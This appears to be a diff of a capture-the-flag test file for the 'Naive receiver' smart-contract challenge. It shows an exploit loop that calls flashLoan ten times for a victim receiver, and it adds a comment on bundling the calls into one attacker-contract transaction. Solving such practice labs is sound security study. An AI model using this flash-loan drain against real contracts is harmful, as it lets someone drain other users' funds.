@@ -51,7 +51,7 @@ describe("[Challenge] Naive receiver", function () {
     /** CODE YOUR EXPLOIT HERE */
     attackerContract = this.pool.connect(attacker);
     for (i = 0; i < 10; i++) {
-      attackerContract.flashLoan(this.receiver.address, 1);
+      attackerContract.flashLoan(this.receiver.address, 1); //10 times in a single ---> use another smart contract and call its function rather and put same logic in that function. Hence one transaction and same output!
     }
   });
 
